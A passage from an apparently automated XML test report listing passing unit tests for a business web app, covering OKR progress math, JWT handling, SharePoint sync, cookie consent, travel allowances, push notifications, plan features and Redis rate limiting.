    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:50},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:50}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:50},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:50}]" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:60},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:50,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:40}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:60},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:50,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:40}]" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:60},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:40}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:60},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:0,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:40}]" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" name="computeObjectiveProgress - parameterized computes weighted progress for [{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100},{&quot;s&quot;:0,&quot;t&quot;:100,&quot;c&quot;:100,&quot;d&quot;:&quot;increase&quot;,&quot;m&quot;:&quot;number&quot;,&quot;w&quot;:100}]" time="0">
    </testcase>
    <testcase classname="computeKRProgress - boolean edge cases (0 1 0 increase boolean) -&gt; 0%" name="computeKRProgress - boolean edge cases (0 1 0 increase boolean) -&gt; 0%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - boolean edge cases (0 1 1 increase boolean) -&gt; 100%" name="computeKRProgress - boolean edge cases (0 1 1 increase boolean) -&gt; 100%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - boolean edge cases (0 1 2 increase boolean) -&gt; 100%" name="computeKRProgress - boolean edge cases (0 1 2 increase boolean) -&gt; 100%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - boolean edge cases (0 1 -1 increase boolean) -&gt; 0%" name="computeKRProgress - boolean edge cases (0 1 -1 increase boolean) -&gt; 0%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - boolean edge cases (0 1 100 increase boolean) -&gt; 100%" name="computeKRProgress - boolean edge cases (0 1 100 increase boolean) -&gt; 100%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=100 current=0 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=100 current=0 -&gt; increase%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=100 current=1 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=100 current=1 -&gt; increase%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=100 current=99 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=100 current=99 -&gt; increase%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=100 current=100 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=100 current=100 -&gt; increase%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=100 current=101 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=100 current=101 -&gt; increase%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=50 target=100 current=50 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=50 target=100 current=50 -&gt; increase%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=50 target=100 current=75 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=50 target=100 current=75 -&gt; increase%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=50 target=100 current=100 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=50 target=100 current=100 -&gt; increase%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=10 current=0 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=10 current=0 -&gt; increase%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=10 current=5 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=10 current=5 -&gt; increase%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - increase boundary boundary: start=0 target=10 current=10 -&gt; increase%" name="computeKRProgress - increase boundary boundary: start=0 target=10 current=10 -&gt; increase%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=100 target=0 current=100 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=100 target=0 current=100 -&gt; decrease%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=100 target=0 current=99 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=100 target=0 current=99 -&gt; decrease%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=100 target=0 current=50 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=100 target=0 current=50 -&gt; decrease%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=100 target=0 current=1 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=100 target=0 current=1 -&gt; decrease%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=100 target=0 current=0 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=100 target=0 current=0 -&gt; decrease%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=100 target=0 current=-10 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=100 target=0 current=-10 -&gt; decrease%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=200 target=100 current=200 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=200 target=100 current=200 -&gt; decrease%" time="0">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=200 target=100 current=150 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=200 target=100 current=150 -&gt; decrease%" time="0.001">
    </testcase>
    <testcase classname="computeKRProgress - decrease boundary decrease: start=200 target=100 current=100 -&gt; decrease%" name="computeKRProgress - decrease boundary decrease: start=200 target=100 current=100 -&gt; decrease%" time="0">
    </testcase>
    <testcase classname="computeObjectiveProgress - expanded handles 4 KRs with equal weights" name="computeObjectiveProgress - expanded handles 4 KRs with equal weights" time="0.001">
    </testcase>
    <testcase classname="computeObjectiveProgress - expanded handles 5 KRs at varying progress" name="computeObjectiveProgress - expanded handles 5 KRs at varying progress" time="0">
    </testcase>
  </testsuite>
  <testsuite name="signJWT" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.98" tests="10">
    <testcase classname="signJWT signs a payload and returns a token string" name="signJWT signs a payload and returns a token string" time="0.008">
    </testcase>
    <testcase classname="signJWT uses custom expiration" name="signJWT uses custom expiration" time="0.001">
    </testcase>
    <testcase classname="verifyJWT verifies a valid token and returns the payload" name="verifyJWT verifies a valid token and returns the payload" time="0.002">
    </testcase>
    <testcase classname="verifyJWT returns null when jwtVerify throws" name="verifyJWT returns null when jwtVerify throws" time="0">
    </testcase>
    <testcase classname="signConvexJWT throws if CONVEX_AUTH_PRIVATE_KEY is not set" name="signConvexJWT throws if CONVEX_AUTH_PRIVATE_KEY is not set" time="0.05">
    </testcase>
    <testcase classname="signConvexJWT throws if CONVEX_SITE_URL is not set (and no NEXT_PUBLIC fallback)" name="signConvexJWT throws if CONVEX_SITE_URL is not set (and no NEXT_PUBLIC fallback)" time="0.002">
    </testcase>
    <testcase classname="signConvexJWT signs a Convex JWT with RS256 and issuer/audience/subject set" name="signConvexJWT signs a Convex JWT with RS256 and issuer/audience/subject set" time="0.006">
    </testcase>
    <testcase classname="signConvexJWT falls back to NEXT_PUBLIC_CONVEX_SITE_URL if CONVEX_SITE_URL is missing" name="signConvexJWT falls back to NEXT_PUBLIC_CONVEX_SITE_URL if CONVEX_SITE_URL is missing" time="0.001">
    </testcase>
    <testcase classname="JWT_SECRET validation on module load module throws when JWT_SECRET is missing" name="JWT_SECRET validation on module load module throws when JWT_SECRET is missing" time="0.015">
    </testcase>
    <testcase classname="JWT_SECRET validation on module load module throws when JWT_SECRET is too short" name="JWT_SECRET validation on module load module throws when JWT_SECRET is too short" time="0.003">
    </testcase>
  </testsuite>
  <testsuite name="COLUMN_MAP" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.899" tests="13">
    <testcase classname="COLUMN_MAP has expected field mappings" name="COLUMN_MAP has expected field mappings" time="0.002">
    </testcase>
    <testcase classname="getSharePointAuthUrl returns OAuth URL" name="getSharePointAuthUrl returns OAuth URL" time="0.003">
    </testcase>
    <testcase classname="getSharePointAuthUrl throws when client ID missing" name="getSharePointAuthUrl throws when client ID missing" time="0.097">
    </testcase>
    <testcase classname="getSharePointAuthUrl throws when tenant ID missing" name="getSharePointAuthUrl throws when tenant ID missing" time="0.003">
    </testcase>
    <testcase classname="exchangeSharePointCode exchanges code for tokens on success" name="exchangeSharePointCode exchanges code for tokens on success" time="0.002">
    </testcase>
    <testcase classname="exchangeSharePointCode throws on API error" name="exchangeSharePointCode throws on API error" time="0.009">
    </testcase>
    <testcase classname="exchangeSharePointCode throws when credentials missing" name="exchangeSharePointCode throws when credentials missing" time="0.004">
    </testcase>
    <testcase classname="refreshSharePointToken refreshes token" name="refreshSharePointToken refreshes token" time="0.004">
    </testcase>
    <testcase classname="refreshSharePointToken throws on API error" name="refreshSharePointToken throws on API error" time="0.001">
    </testcase>
    <testcase classname="refreshSharePointToken throws when credentials missing" name="refreshSharePointToken throws when credentials missing" time="0.001">
    </testcase>
    <testcase classname="mapSharePointToEmployee maps fields" name="mapSharePointToEmployee maps fields" time="0.001">
    </testcase>
    <testcase classname="mapSharePointToEmployee returns null for missing email" name="mapSharePointToEmployee returns null for missing email" time="0.001">
    </testcase>
    <testcase classname="fetchSharePointListItems fetches" name="fetchSharePointListItems fetches" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="cookieConsentStore" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.818" tests="15">
    <testcase classname="cookieConsentStore initial state starts without consent" name="cookieConsentStore initial state starts without consent" time="0.003">
    </testcase>
    <testcase classname="cookieConsentStore initial state shows banner by default" name="cookieConsentStore initial state shows banner by default" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore initial state has settings closed by default" name="cookieConsentStore initial state has settings closed by default" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore initial state has necessary true and all others false by default" name="cookieConsentStore initial state has necessary true and all others false by default" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore acceptAll sets hasConsent true and hides banner" name="cookieConsentStore acceptAll sets hasConsent true and hides banner" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore acceptAll enables all preferences" name="cookieConsentStore acceptAll enables all preferences" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore rejectAll sets hasConsent true and hides banner" name="cookieConsentStore rejectAll sets hasConsent true and hides banner" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore rejectAll keeps only necessary enabled" name="cookieConsentStore rejectAll keeps only necessary enabled" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore savePreferences saves given preferences and overwrites analytics/marketing/preferences" name="cookieConsentStore savePreferences saves given preferences and overwrites analytics/marketing/preferences" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore savePreferences always sets necessary to true even if passed false" name="cookieConsentStore savePreferences always sets necessary to true even if passed false" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore savePreferences closes settings after saving" name="cookieConsentStore savePreferences closes settings after saving" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore openSettings / closeSettings opens settings" name="cookieConsentStore openSettings / closeSettings opens settings" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore openSettings / closeSettings closes settings" name="cookieConsentStore openSettings / closeSettings closes settings" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore resetConsent resets to initial state" name="cookieConsentStore resetConsent resets to initial state" time="0.001">
    </testcase>
    <testcase classname="cookieConsentStore persist partialize only persists hasConsent and preferences" name="cookieConsentStore persist partialize only persists hasConsent and preferences" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="exportTripsToExcel" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.917" tests="6">
    <testcase classname="exportTripsToExcel creates workbook and writes rows" name="exportTripsToExcel creates workbook and writes rows" time="0.01">
    </testcase>
    <testcase classname="exportTripsToExcel styles header row (bold, gray fill)" name="exportTripsToExcel styles header row (bold, gray fill)" time="0.002">
    </testcase>
    <testcase classname="exportTripsToExcel handles empty trips array" name="exportTripsToExcel handles empty trips array" time="0.002">
    </testcase>
    <testcase classname="exportTripsToExcel uses default filename when not provided" name="exportTripsToExcel uses default filename when not provided" time="0.002">
    </testcase>
    <testcase classname="exportTripsToCSV generates CSV with headers and data rows" name="exportTripsToCSV generates CSV with headers and data rows" time="0.008">
    </testcase>
    <testcase classname="exportTripsToCSV handles empty trips array" name="exportTripsToCSV handles empty trips array" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="getTravelAllowance" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:04" time="0.769" tests="15">
    <testcase classname="getTravelAllowance returns 12000 for contractor email" name="getTravelAllowance returns 12000 for contractor email" time="0.002">
    </testcase>
    <testcase classname="getTravelAllowance returns 20000 for staff email" name="getTravelAllowance returns 20000 for staff email" time="0.001">
    </testcase>
    <testcase classname="getTravelAllowance is case-insensitive for contractor check" name="getTravelAllowance is case-insensitive for contractor check" time="0">
    </testcase>
    <testcase classname="getTravelAllowance handles email without contractor keyword" name="getTravelAllowance handles email without contractor keyword" time="0.001">
    </testcase>
    <testcase classname="getInitials (types) returns first two word initials" name="getInitials (types) returns first two word initials" time="0.001">
    </testcase>
    <testcase classname="getInitials (types) handles single word" name="getInitials (types) handles single word" time="0">
    </testcase>
    <testcase classname="getInitials (types) uppercases result" name="getInitials (types) uppercases result" time="0.001">
    </testcase>
    <testcase classname="getInitials (types) handles empty string" name="getInitials (types) handles empty string" time="0.001">
    </testcase>
    <testcase classname="calculateDays calculates inclusive days between dates" name="calculateDays calculates inclusive days between dates" time="0">
    </testcase>
    <testcase classname="calculateDays returns 1 when start equals end" name="calculateDays returns 1 when start equals end" time="0">
    </testcase>
    <testcase classname="calculateDays returns 1 when end is before start" name="calculateDays returns 1 when end is before start" time="0.001">
    </testcase>
    <testcase classname="calculateDays handles month boundaries" name="calculateDays handles month boundaries" time="0.001">
    </testcase>
    <testcase classname="formatCurrency (types) formats number with AMD symbol" name="formatCurrency (types) formats number with AMD symbol" time="0.001">
    </testcase>
    <testcase classname="formatCurrency (types) handles zero" name="formatCurrency (types) handles zero" time="0.001">
    </testcase>
    <testcase classname="formatCurrency (types) handles negative values" name="formatCurrency (types) handles negative values" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="cn" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.645" tests="10">
    <testcase classname="cn merges class names" name="cn merges class names" time="0.018">
    </testcase>
    <testcase classname="cn handles conditional classes" name="cn handles conditional classes" time="0.001">
    </testcase>
    <testcase classname="cn handles undefined and null values" name="cn handles undefined and null values" time="0">
    </testcase>
    <testcase classname="cn handles empty inputs" name="cn handles empty inputs" time="0.001">
    </testcase>
    <testcase classname="cn handles object syntax" name="cn handles object syntax" time="0">
    </testcase>
    <testcase classname="cn tailwind-merge: resolves conflicting classes" name="cn tailwind-merge: resolves conflicting classes" time="0">
    </testcase>
    <testcase classname="cn tailwind-merge: resolves padding conflicts" name="cn tailwind-merge: resolves padding conflicts" time="0.001">
    </testcase>
    <testcase classname="cn tailwind-merge: merges different properties" name="cn tailwind-merge: merges different properties" time="0.001">
    </testcase>
    <testcase classname="cn tailwind-merge: handles array syntax" name="cn tailwind-merge: handles array syntax" time="0.001">
    </testcase>
    <testcase classname="cn tailwind-merge: handles complex conditional compositions" name="cn tailwind-merge: handles complex conditional compositions" time="0.002">
    </testcase>
  </testsuite>
  <testsuite name="isPushNotificationSupported" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.612" tests="20">
    <testcase classname="isPushNotificationSupported returns true when serviceWorker and PushManager exist" name="isPushNotificationSupported returns true when serviceWorker and PushManager exist" time="0.003">
    </testcase>
    <testcase classname="isPushNotificationSupported returns false when serviceWorker is missing" name="isPushNotificationSupported returns false when serviceWorker is missing" time="0.001">
    </testcase>
    <testcase classname="registerServiceWorker registers and returns registration" name="registerServiceWorker registers and returns registration" time="0.002">
    </testcase>
    <testcase classname="registerServiceWorker returns null when serviceWorker not supported" name="registerServiceWorker returns null when serviceWorker not supported" time="0.001">
    </testcase>
    <testcase classname="registerServiceWorker returns null on registration error" name="registerServiceWorker returns null on registration error" time="0.002">
    </testcase>
    <testcase classname="requestNotificationPermission returns granted on user approval" name="requestNotificationPermission returns granted on user approval" time="0.001">
    </testcase>
    <testcase classname="requestNotificationPermission returns denied when notifications not supported" name="requestNotificationPermission returns denied when notifications not supported" time="0.002">
    </testcase>
    <testcase classname="subscribeToPushNotifications returns subscription on success" name="subscribeToPushNotifications returns subscription on success" time="0.002">
    </testcase>
    <testcase classname="subscribeToPushNotifications returns null when push not supported" name="subscribeToPushNotifications returns null when push not supported" time="0.001">
    </testcase>
    <testcase classname="subscribeToPushNotifications returns null when permission denied" name="subscribeToPushNotifications returns null when permission denied" time="0.001">
    </testcase>
    <testcase classname="subscribeToPushNotifications uses existing subscription if already subscribed" name="subscribeToPushNotifications uses existing subscription if already subscribed" time="0.001">
    </testcase>
    <testcase classname="subscribeToPushNotifications falls back to default VAPID key when env var missing" name="subscribeToPushNotifications falls back to default VAPID key when env var missing" time="0.001">
    </testcase>
    <testcase classname="unsubscribeFromPushNotifications unsubscribes and returns true" name="unsubscribeFromPushNotifications unsubscribes and returns true" time="0.001">
    </testcase>
    <testcase classname="unsubscribeFromPushNotifications returns false when no subscription exists" name="unsubscribeFromPushNotifications returns false when no subscription exists" time="0.001">
    </testcase>
    <testcase classname="unsubscribeFromPushNotifications returns false on error" name="unsubscribeFromPushNotifications returns false on error" time="0.001">
    </testcase>
    <testcase classname="sendLocalPushNotification shows notification with default options" name="sendLocalPushNotification shows notification with default options" time="0.002">
    </testcase>
    <testcase classname="sendLocalPushNotification shows notification with custom options" name="sendLocalPushNotification shows notification with custom options" time="0.002">
    </testcase>
    <testcase classname="sendLocalPushNotification does nothing when push not supported" name="sendLocalPushNotification does nothing when push not supported" time="0.001">
    </testcase>
    <testcase classname="getNotificationPermission returns Notification.permission" name="getNotificationPermission returns Notification.permission" time="0.001">
    </testcase>
    <testcase classname="getNotificationPermission returns denied when Notification API missing" name="getNotificationPermission returns denied when Notification API missing" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="PLAN_FEATURES" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.83" tests="22">
    <testcase classname="PLAN_FEATURES starter plan has limited features" name="PLAN_FEATURES starter plan has limited features" time="0.011">
    </testcase>
    <testcase classname="PLAN_FEATURES professional plan has full features" name="PLAN_FEATURES professional plan has full features" time="0.001">
    </testcase>
    <testcase classname="PLAN_FEATURES enterprise plan has unlimited employees" name="PLAN_FEATURES enterprise plan has unlimited employees" time="0.001">
    </testcase>
    <testcase classname="PLAN_FEATURES starter has integrations: true (source data has it on all except professional)" name="PLAN_FEATURES starter has integrations: true (source data has it on all except professional)" time="0.001">
    </testcase>
    <testcase classname="PLAN_FEATURES all plans have analytics: true" name="PLAN_FEATURES all plans have analytics: true" time="0.001">
    </testcase>
    <testcase classname="planIncludes starter includes starter" name="planIncludes starter includes starter" time="0">
    </testcase>
    <testcase classname="planIncludes enterprise includes starter" name="planIncludes enterprise includes starter" time="0.001">
    </testcase>
    <testcase classname="planIncludes starter does NOT include professional" name="planIncludes starter does NOT include professional" time="0">
    </testcase>
    <testcase classname="planIncludes professional does NOT include enterprise" name="planIncludes professional does NOT include enterprise" time="0.001">
    </testcase>
    <testcase classname="planIncludes all plans include themselves" name="planIncludes all plans include themselves" time="0.001">
    </testcase>
    <testcase classname="PLAN_LABELS has correct labels" name="PLAN_LABELS has correct labels" time="0">
    </testcase>
    <testcase classname="PLAN_PRICES has prices for all plans" name="PLAN_PRICES has prices for all plans" time="0">
    </testcase>
    <testcase classname="PLAN_UPGRADE_URL has upgrade URLs for all plans" name="PLAN_UPGRADE_URL has upgrade URLs for all plans" time="0">
    </testcase>
    <testcase classname="usePlanFeatures returns professional features when on professional plan" name="usePlanFeatures returns professional features when on professional plan" time="0.002">
    </testcase>
    <testcase classname="usePlanFeatures returns starter features when plan is not active" name="usePlanFeatures returns starter features when plan is not active" time="0">
    </testcase>
    <testcase classname="usePlanFeatures returns starter features when no subscription data" name="usePlanFeatures returns starter features when no subscription data" time="0">
    </testcase>
    <testcase classname="usePlanFeatures canAccess returns true for feature that exists on current plan" name="usePlanFeatures canAccess returns true for feature that exists on current plan" time="0.001">
    </testcase>
    <testcase classname="usePlanFeatures canAccess returns false for feature not on current plan" name="usePlanFeatures canAccess returns false for feature not on current plan" time="0.001">
    </testcase>
    <testcase classname="usePlanFeatures canAccess returns false while loading" name="usePlanFeatures canAccess returns false while loading" time="0">
    </testcase>
    <testcase classname="usePlanFeatures requiresPlan returns minimum plan for strategyMaps" name="usePlanFeatures requiresPlan returns minimum plan for strategyMaps" time="0.001">
    </testcase>
    <testcase classname="usePlanFeatures requiresPlan returns minimum plan for analytics" name="usePlanFeatures requiresPlan returns minimum plan for analytics" time="0.001">
    </testcase>
    <testcase classname="usePlanFeatures requiresPlan returns null for nonexistent feature" name="usePlanFeatures requiresPlan returns null for nonexistent feature" time="0">
    </testcase>
  </testsuite>
  <testsuite name="redis — checkRateLimit" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.931" tests="28">
    <testcase classname="redis — checkRateLimit allows request within limit (incr=1, max=5)" name="redis — checkRateLimit allows request within limit (incr=1, max=5)" time="0.003">
    </testcase>
    <testcase classname="redis — checkRateLimit blocks request when over limit (incr=10, max=5)" name="redis — checkRateLimit blocks request when over limit (incr=10, max=5)" time="0.001">
    </testcase>
    <testcase classname="redis — checkRateLimit allows request at limit exactly (incr=5, max=5)" name="redis — checkRateLimit allows request at limit exactly (incr=5, max=5)" time="0.001">
    </testcase>
    <testcase classname="redis — checkRateLimit returns resetAt timestamp in the future" name="redis — checkRateLimit returns resetAt timestamp in the future" time="0.002">
    </testcase>
    <testcase classname="redis — checkRateLimit falls back when Redis is not configured (no env vars)" name="redis — checkRateLimit falls back when Redis is not configured (no env vars)" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason isBlocked returns false when key not set" name="redis — isBlocked / blockKey / unblockKey / getBlockReason isBlocked returns false when key not set" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason isBlocked returns true when key is set to 1" name="redis — isBlocked / blockKey / unblockKey / getBlockReason isBlocked returns true when key is set to 1" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason blockKey calls multi.set and multi.expire" name="redis — isBlocked / blockKey / unblockKey / getBlockReason blockKey calls multi.set and multi.expire" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason blockKey works without reason" name="redis — isBlocked / blockKey / unblockKey / getBlockReason blockKey works without reason" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason unblockKey deletes block keys" name="redis — isBlocked / blockKey / unblockKey / getBlockReason unblockKey deletes block keys" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason getBlockReason returns null when no reason stored" name="redis — isBlocked / blockKey / unblockKey / getBlockReason getBlockReason returns null when no reason stored" time="0.001">
    </testcase>
    <testcase classname="redis — isBlocked / blockKey / unblockKey / getBlockReason getBlockReason returns reason string when stored" name="redis — isBlocked / blockKey / unblockKey / getBlockReason getBlockReason returns reason string when stored" time="0">
    </testcase>
    <testcase classname="redis — logLoginAttempt / getFailedLoginCount logLoginAttempt does not throw on failed attempt" name="redis — logLoginAttempt / getFailedLoginCount logLoginAttempt does not throw on failed attempt" time="0.002">
    </testcase>
    <testcase classname="redis — logLoginAttempt / getFailedLoginCount logLoginAttempt does not throw on success" name="redis — logLoginAttempt / getFailedLoginCount logLoginAttempt does not throw on success" time="0.001">
    </testcase>
    <testcase classname="redis — logLoginAttempt / getFailedLoginCount logLoginAttempt includes riskScore" name="redis — logLoginAttempt / getFailedLoginCount logLoginAttempt includes riskScore" time="0.001">
    </testcase>
    <testcase classname="redis — logLoginAttempt / getFailedLoginCount getFailedLoginCount returns 0 by default" name="redis — logLoginAttempt / getFailedLoginCount getFailedLoginCount returns 0 by default" time="0.001">
    </testcase>
    <testcase classname="redis — logSecurityEvent / getSecurityEvents logSecurityEvent does not throw" name="redis — logSecurityEvent / getSecurityEvents logSecurityEvent does not throw" time="0.001">
    </testcase>
    <testcase classname="redis — logSecurityEvent / getSecurityEvents logSecurityEvent accepts details" name="redis — logSecurityEvent / getSecurityEvents logSecurityEvent accepts details" time="0.001">
    </testcase>
    <testcase classname="redis — logSecurityEvent / getSecurityEvents getSecurityEvents returns empty array by default" name="redis — logSecurityEvent / getSecurityEvents getSecurityEvents returns empty array by default" time="0.001">
    </testcase>
    <testcase classname="redis — testRedisConnection / getRedisStats testRedisConnection returns true when ping works" name="redis — testRedisConnection / getRedisStats testRedisConnection returns true when ping works" time="0.001">
    </testcase>
    <testcase classname="redis — testRedisConnection / getRedisStats getRedisStats returns connected: true" name="redis — testRedisConnection / getRedisStats getRedisStats returns connected: true" time="0.002">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern getCache returns null when key missing" name="redis — getCache / setCache / deleteCache / invalidateCachePattern getCache returns null when key missing" time="0.001">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern setCache does not throw" name="redis — getCache / setCache / deleteCache / invalidateCachePattern setCache does not throw" time="0.001">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern setCache accepts custom TTL" name="redis — getCache / setCache / deleteCache / invalidateCachePattern setCache accepts custom TTL" time="0.001">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern deleteCache does not throw" name="redis — getCache / setCache / deleteCache / invalidateCachePattern deleteCache does not throw" time="0.001">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern invalidateCachePattern does not throw" name="redis — getCache / setCache / deleteCache / invalidateCachePattern invalidateCachePattern does not throw" time="0.001">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern invalidateCachePattern handles empty keys result gracefully" name="redis — getCache / setCache / deleteCache / invalidateCachePattern invalidateCachePattern handles empty keys result gracefully" time="0.001">
    </testcase>
    <testcase classname="redis — getCache / setCache / deleteCache / invalidateCachePattern invalidateCachePattern deletes matching keys" name="redis — getCache / setCache / deleteCache / invalidateCachePattern invalidateCachePattern deletes matching keys" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="rate limit configs" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.714" tests="13">
